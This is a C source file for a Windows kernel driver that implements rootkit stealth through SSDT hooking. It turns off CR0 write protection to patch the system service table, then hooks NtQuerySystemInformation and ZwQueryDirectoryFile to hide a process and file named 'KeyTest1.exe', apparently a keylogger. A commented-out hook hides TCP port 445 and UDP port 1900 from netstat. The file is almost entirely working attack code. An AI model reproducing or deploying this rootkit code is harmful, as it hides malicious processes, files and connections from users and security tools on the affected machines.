#include "SSDTHook.h"
#include "SSDTFunction.h"

PVOID SSDTHook1(PCHAR funName, PVOID funHook)
{
	UNICODE_STRING ustrDllFileName;
	ULONG ulSSDTFunctionIndex = 0;
	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, funName);
	return Hook(ulSSDTFunctionIndex, funHook);
}

PVOID Hook(ULONG ServiceNumber, PVOID Hook)
{
	PVOID OrigAddress;

	OrigAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ServiceNumber];

	__asm
	{
		cli
		mov eax, cr0
		and eax, not 0x10000
		mov cr0, eax
	}

	KeServiceDescriptorTable.ServiceTableBase[ServiceNumber] = (ULONG)Hook;

	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	return OrigAddress;
}

//// SSDT Hook
//BOOLEAN SSDTHook()
//{
//	UNICODE_STRING ustrDllFileName;
//	ULONG ulSSDTFunctionIndex = 0;
//	PMDL pMdl = NULL;
//	PVOID pNewAddress = NULL;
//	ULONG ulNewFuncAddr = 0;
//
//	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
//	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
//	g_pOldSSDTFunctionAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];
//	if (NULL == g_pOldSSDTFunctionAddress)
//	{
//		DbgPrint("[Test]Get SSDT Function Error!\n");
//		return FALSE;
//	}
//	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
//	if (NULL == pMdl)
//	{
//		DbgPrint("[Test]MmCreateMdl Error!\n");
//		return FALSE;
//	}
//	MmBuildMdlForNonPagedPool(pMdl);
//	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
//	if (NULL == pNewAddress)
//	{
//		IoFreeMdl(pMdl);
//		DbgPrint("[Test]MmMapLockedPages Error!\n");
//		return FALSE;
//	}
//	ulNewFuncAddr = (ULONG)New_ZwQueryDirectoryFile;
//	RtlCopyMemory(pNewAddress, &ulNewFuncAddr, sizeof(ULONG));
//
//	MmUnmapLockedPages(pNewAddress, pMdl);
//	IoFreeMdl(pMdl);
//
//	return TRUE;
//}
//
//// SSDT Unhook
//BOOLEAN SSDTUnhook()
//{
//	UNICODE_STRING ustrDllFileName;
//	ULONG ulSSDTFunctionIndex = 0;
//	PVOID pSSDTFunctionAddress = NULL;
//	PMDL pMdl = NULL;
//	PVOID pNewAddress = NULL;
//	ULONG ulOldFuncAddr = 0;
//
//	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
//	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
//	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
//	if (NULL == pMdl)
//	{
//		DbgPrint("[Test]MmCreateMdl Error!\n");
//		return FALSE;
//	}
//	MmBuildMdlForNonPagedPool(pMdl);
//	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
//	if (NULL == pNewAddress)
//	{
//		IoFreeMdl(pMdl);
//		DbgPrint("[Test]MmMapLockedPages Error!\n");
//		return FALSE;
//	}
//	ulOldFuncAddr = (ULONG)g_pOldSSDTFunctionAddress;
//	RtlCopyMemory(pNewAddress, &ulOldFuncAddr, sizeof(ULONG));
//
//	MmUnmapLockedPages(pNewAddress, pMdl);
//	IoFreeMdl(pMdl);
//
//	return TRUE;
//}

NTSTATUS New_NtQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength)
{
	typedef NTSTATUS(*typedef_ZwQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
	PSYSTEM_PROCESS_INFO pCurr, pNext;
	NTSTATUS ret;

	ret = ((typedef_ZwQuerySystemInformation)g_pOldSSDTFunctionAddress2)(InfoClass, Buffer, Length, ReturnLength);


	if (NT_SUCCESS(ret) && InfoClass == 5)
	{
		pCurr = NULL;
		pNext = Buffer;

		while (pNext->NextEntryOffset != 0)
		{
			pCurr = pNext;
			pNext = (PSYSTEM_PROCESS_INFO)((PUCHAR)pCurr + pCurr->NextEntryOffset);

			if (!wcscmp(L"KeyTest1.exe", pNext->ImageName.Buffer))
			{
				if (pNext->NextEntryOffset == 0)
				{
					pCurr->NextEntryOffset = 0;
				}

				else
				{
					pCurr->NextEntryOffset += pNext->NextEntryOffset;
				}

				pNext = pCurr;
			}
		}
	}
	return ret;
}

NTSTATUS New_ZwQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan
)
{
	NTSTATUS status;
	typedef NTSTATUS(*typedef_ZwQueryDirectoryFile)(
		IN HANDLE               FileHandle,
		IN HANDLE               Event OPTIONAL,
		IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
		IN PVOID                ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK    IoStatusBlock,
		OUT PVOID               FileInformation,
		IN ULONG                Length,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN              ReturnSingleEntry,
		IN PUNICODE_STRING      FileMask OPTIONAL,
		IN BOOLEAN              RestartScan
		);
	status = ((typedef_ZwQueryDirectoryFile)g_pOldSSDTFunctionAddress1)(FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileMask,
		RestartScan);

	if (NT_SUCCESS(status) && (
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation
		))
	{
		PVOID pCurrent = FileInformation;
		PVOID pPre = NULL;
		ULONG ulNextOffset = 0;
		ULONG ulBufferSize = 1024;
		PWCHAR pwszFileName = ExAllocatePool(NonPagedPool, ulBufferSize);
		if (NULL == pwszFileName)
		{
			return status;
		}

		do
		{
			ulNextOffset = GetNextEntryOffset(pCurrent, FileInformationClass);
			RtlZeroMemory(pwszFileName, ulBufferSize);
			GetEntryFileName(pCurrent, FileInformationClass, pwszFileName, ulBufferSize);
			DbgPrint("[Test][%S]\n", pwszFileName);

			if (NULL != wcsstr(pwszFileName, L"KeyTest1.exe"))
			{
				DbgPrint("[Test]Have Hide File Or Directory![%S]\n", pwszFileName);
				if (0 == ulNextOffset)
				{
					if (NULL == pPre)
					{
						status = STATUS_NO_MORE_FILES;
					}
					else
					{
						SetNextEntryOffset(pPre, FileInformationClass, 0);
					}
					break;
				}
				else
				{
					ULONG ulCurrentOffset = (ULONG)((PUCHAR)pCurrent - (PUCHAR)FileInformation);
					ULONG ulLeftInfoData = (ULONG)Length - (ulCurrentOffset + ulNextOffset);
					RtlCopyMemory(pCurrent, (PVOID)((PUCHAR)pCurrent + ulNextOffset), ulLeftInfoData);

					continue;
				}
			}
			pPre = pCurrent;
			pCurrent = ((PUCHAR)pCurrent + ulNextOffset);
		} while (0 != ulNextOffset);

		if (pwszFileName)
		{
			ExFreePool(pwszFileName);
			pwszFileName = NULL;
		}
	}
	return status;
}

VOID GetEntryFileName(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, PWCHAR pwszFileName, ULONG ulBufferSize)
{
	PWCHAR result = NULL;
	ULONG ulLength = 0;

	switch (FileInfo)
	{
	case FileDirectoryInformation:
		result = (PWCHAR) & ((PFILE_DIRECTORY_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_DIRECTORY_INFORMATION)pData)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		result = (PWCHAR) & ((PFILE_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		result = (PWCHAR) & ((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		result = (PWCHAR) & ((PFILE_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		result = (PWCHAR) & ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileNamesInformation:
		result = (PWCHAR) & ((PFILE_NAMES_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_NAMES_INFORMATION)pData)->FileNameLength;
		break;
	}

	RtlZeroMemory(pwszFileName, ulBufferSize);
	RtlCopyMemory(pwszFileName, result, ulLength);
}

VOID SetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN ULONG Offset)
{
	switch (FileInfo)
	{
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	}
}

ULONG GetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo)
{
	ULONG result = 0;
	switch (FileInfo) {
	case FileDirectoryInformation:
		result = ((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = ((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = ((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = ((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset;
		break;
	}
	return result;
}


//NTSTATUS HookZwDeviceIoControlFile(
//	IN HANDLE FileHandle,
//	IN HANDLE Event,
//	IN PIO_APC_ROUTINE ApcRoutine,
//	IN PVOID ApcContext,
//	OUT PIO_STATUS_BLOCK IoStatusBlock,
//	IN ULONG IoControlCode,
//	IN PVOID InputBuffer,
//	IN ULONG InputBufferLength,
//	OUT PVOID OutputBuffer,
//	IN ULONG OutputBufferLength)
//{
//
//	NTSTATUS rtStatus = STATUS_SUCCESS;
//	TCPAddrEntry* TcpTable;
//	TCPAddrExEntry* TcpExTable;
//	UDPAddrEntry* UdpTable;
//	UDPAddrExEntry* UdpExTable;
//	ULONG numconn;
//	ULONG i;
//	ULONG RetLen;
//
//	UCHAR buff[512];
//	POBJECT_NAME_INFORMATION ObjectName = (PVOID)&buff;
//	ANSI_STRING ObjectNameAnsi;
//	PUCHAR InBuff;
//
//
//	ZWDEVICEIOCONTROLFILE pOldZwDeviceIoControlFile = (ZWDEVICEIOCONTROLFILE)oldSysServiceAddr[SYSCALL_INDEX(ZwDeviceIoControlFile)];
//	rtStatus = ((ZWDEVICEIOCONTROLFILE)(pOldZwDeviceIoControlFile)) (
//		FileHandle,
//		Event,
//		ApcRoutine,
//		ApcContext,
//		IoStatusBlock,
//		IoControlCode,
//		InputBuffer,
//		InputBufferLength,
//		OutputBuffer,
//		OutputBufferLength);
//	if (NT_SUCCESS(rtStatus) && IoControlCode == 0x120003)//netstat use this IoControlCode
//	{
//		if (NT_SUCCESS(ZwQueryObject(FileHandle, ObjectNameInformation, ObjectName, 512, &RetLen)))
//		{
//			RtlUnicodeStringToAnsiString(&ObjectNameAnsi, &ObjectName->Name, TRUE);
//			if (_strnicmp(ObjectNameAnsi.Buffer, TCP_PORT_DEVICE, strlen(TCP_PORT_DEVICE)) == 0)
//			{
//				if (((InBuff = (PUCHAR)InputBuffer) == NULL) || (InputBufferLength < 17))//InputBuffer is wrong
//					return rtStatus;
//				//For TCP queries, the input buffer is characterized by InputBuffer[0] being 0x00, and InputBuffer[17] being 0x01 if port data already exists in OutputBuffer.
//				//If it is an extended structure, the InputBuffer[16] is 0x02. For UDP queries, InputBuffer[0] is 0x01, and InputBuffer[16] and InputBuffer[17] have the same value as TCP queries.
//
////-------------------------------------------------------TCP----------------------------------------------------------------------------
//				if ((InBuff[0] == 0x00) && (InBuff[17] == 0x01)) //TCP port
//				{
//					if (InBuff[16] != 0x02) //Non-Extended Structure
//					{
//						numconn = IoStatusBlock->Information / sizeof(TCPAddrEntry);
//						TcpTable = (TCPAddrEntry*)OutputBuffer;
//						for (i = 0; i < numconn; i++)
//						{
//							if (ntohs(TcpTable[i].tae_ConnLocalPort) == 445)
//							{
//								//DbgPrint("JiurlPortHide: HidePort %d/n", ntohs(TcpTable[i].tae_ConnLocalPort));
//								memcpy((TcpTable + i), (TcpTable + i + 1), ((numconn - i - 1) * sizeof(TCPAddrEntry)));
//								numconn--;
//								i--;
//							}
//						}
//						IoStatusBlock->Information = numconn * sizeof(TCPAddrEntry);
//					}
//					if (InBuff[16] == 0x02)//Extended structure
//					{
//						numconn = IoStatusBlock->Information / sizeof(TCPAddrExEntry);
//						TcpExTable = (TCPAddrExEntry*)OutputBuffer;
//						for (i = 0; i < numconn; i++)
//						{
//							if (ntohs(TcpExTable[i].tae_ConnLocalPort) == 445)
//								if (TcpExTable[i].pid == 0)
//								{
//									//DbgPrint("JiurlPortHide: HidePort %d/n",ntohs(TcpExTable[i].tae_ConnLocalPort));
//									memcpy((TcpExTable + i), (TcpExTable + i + 1), ((numconn - i - 1) * sizeof(TCPAddrExEntry)));
//									numconn--;
//									i--;
//								}
//						}
//						IoStatusBlock->Information = numconn * sizeof(TCPAddrExEntry);
//					}
//				}
//				//-----------------------------------------------------------UDP---------------------------------------------------------------
//				if ((InBuff[0] == 0x01) && (InBuff[17] == 0x01)) //TCP port
//				{
//					if (InBuff[16] != 0x02) //Non-Extended Structure
//					{
//						numconn = IoStatusBlock->Information / sizeof(UDPAddrEntry);
//						UdpTable = (UDPAddrEntry*)OutputBuffer;
//						for (i = 0; i < numconn; i++)
//						{
//							if (ntohs(UdpTable[i].tae_ConnLocalPort) == 1900)
//							{
//								//DbgPrint("JiurlPortHide: HidePort %d/n", ntohs(UdpTable[i].tae_ConnLocalPort));
//								memcpy((UdpTable + i), (UdpTable + i + 1), ((numconn - i - 1) * sizeof(UDPAddrEntry)));
//								numconn--;
//								i--;
//							}
//						}
//						IoStatusBlock->Information = numconn * sizeof(UDPAddrEntry);
//					}
//					if (InBuff[16] == 0x02)//Extended structure
//					{
//						numconn = IoStatusBlock->Information / sizeof(UDPAddrExEntry);
//						UdpExTable = (UDPAddrExEntry*)OutputBuffer;
//						for (i = 0; i < numconn; i++)
//						{
//							if (ntohs(UdpExTable[i].tae_ConnLocalPort) == 1900)
//							{
//								//DbgPrint("JiurlPortHide: HidePort %d/n",ntohs(UdpExTable[i].tae_ConnLocalPort));
//								memcpy((UdpExTable + i), (UdpExTable + i + 1), ((numconn - i - 1) * sizeof(UDPAddrExEntry)));
//								numconn--;
//								i--;
//							}
//						}
//						IoStatusBlock->Information = numconn * sizeof(UDPAddrExEntry);
//					}
//				}
//			}
//
//		}
//	}
//	return rtStatus;
//}


